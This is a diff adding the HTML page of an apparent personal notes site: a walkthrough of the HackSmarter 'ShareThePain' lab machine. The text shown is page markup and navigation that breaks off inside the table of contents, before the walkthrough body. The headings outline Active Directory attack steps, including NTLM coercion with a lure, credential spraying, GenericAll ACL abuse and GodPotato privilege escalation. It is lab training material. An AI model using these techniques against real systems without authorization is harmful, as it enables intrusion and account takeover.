@@ -1,0 +1,2494 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../../..">
+      
+      
+        <link rel="next" href="../Scope/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../images/favicon.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Machine Walkthrough - My Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/catppuccin.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="catppuccin-mocha" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#machine-walkthrough" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="My Notes" class="md-header__button md-logo" aria-label="My Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm0 6c1.4 0 2.8 1.1 2.8 2.5V11c.6 0 1.2.6 1.2 1.3v3.5c0 .6-.6 1.2-1.3 1.2H9.2c-.6 0-1.2-.6-1.2-1.3v-3.5c0-.6.6-1.2 1.2-1.2V9.5C9.2 8.1 10.6 7 12 7m0 1.2c-.8 0-1.5.5-1.5 1.3V11h3V9.5c0-.8-.7-1.3-1.5-1.3"></path></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Machine Walkthrough
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required="">
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix="">
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="My Notes" class="md-nav__button md-logo" aria-label="My Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm0 6c1.4 0 2.8 1.1 2.8 2.5V11c.6 0 1.2.6 1.2 1.3v3.5c0 .6-.6 1.2-1.3 1.2H9.2c-.6 0-1.2-.6-1.2-1.3v-3.5c0-.6.6-1.2 1.2-1.2V9.5C9.2 8.1 10.6 7 12 7m0 1.2c-.8 0-1.5.5-1.5 1.3V11h3V9.5c0-.8-.7-1.3-1.5-1.3"></path></svg>
+
+    </a>
+    My Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix="">
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    My Notes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Labs
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Labs
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackSmarter
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HackSmarter
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_1" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_1" id="__nav_2_1_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BuildingMagic
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    BuildingMagic
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Machine Walkthrough
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Machine Walkthrough
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#machine-walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Machine Walkthrough
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hacksmarter-sharethepain-machine_walkthrough-rooted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HackSmarter #ShareThePain #Machine_Walkthrough #Rooted
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sharethepain-machine-walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ShareThePain Machine Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ShareThePain Machine Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#create-working-directory" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create Working Directory
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#coerce-ntlm-authentication-using-lure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Coerce NTLM Authentication using Lure
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Coerce NTLM Authentication using Lure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#got-a-bite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Got a Bite
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows-enumeration-for-bobross" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Enumeration for bob.ross
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rapids-credential-spraying" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rapids Credential Spraying
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BloodHound Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="BloodHound Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#install-bloodhound-ce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Install Bloodhound-CE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rusthound-ce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RustHound-CE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#runoff-bloodhound-ce-analyzer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Runoff (BloodHound-CE Analyzer)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Runoff (BloodHound-CE Analyzer)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#abusing-genricall-acl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Abusing GenricAll ACL
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-ligolo-for-better-pivoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using ligolo for better pivoting
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Using ligolo for better pivoting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#check-mysql-privs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Check MySQL Privs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#god-potato-to-privesc-from-mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        God Potato to PrivEsc from MySQL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-new-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create New User
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Scope/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Scope
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_2">
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_2" id="__nav_2_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ShareThePain
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ShareThePain
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ShareThePain/Machine%20Walkthrough%202/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Machine Walkthrough 2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ShareThePain/Scope%202/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Scope 2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3">
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../OS/Kali/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kali
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4">
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tools
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Tools/Listeners/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Listeners
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5">
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Training
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Training
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1">
+        
+          
+          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackSmarter
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HackSmarter
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Training/HackSmarter/OSCP%20Path/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSCP Path
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6">
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1">
+        
+          
+          <label class="md-nav__link" for="__nav_6_1" id="__nav_6_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Uploads
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    File Uploads
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Web/File%20Uploads/Bypass%20Client-Side%20Controls/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bypass Client Side Controls
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Web/File%20Uploads/Bypass%20MIME%20Checks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bypass MIME Checks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Web/File%20Uploads/Bypass%20Server-Side%20Inspection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bypass Server Side Inspection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2">
+        
+          
+          <label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shell
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Shell
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Web/Shell/PHP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PHP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7">
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Windows/File%20Transfer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Transfer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#machine-walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Machine Walkthrough
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hacksmarter-sharethepain-machine_walkthrough-rooted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HackSmarter #ShareThePain #Machine_Walkthrough #Rooted
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sharethepain-machine-walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ShareThePain Machine Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ShareThePain Machine Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#create-working-directory" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create Working Directory
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#coerce-ntlm-authentication-using-lure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Coerce NTLM Authentication using Lure
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Coerce NTLM Authentication using Lure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#got-a-bite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Got a Bite
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows-enumeration-for-bobross" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Enumeration for bob.ross
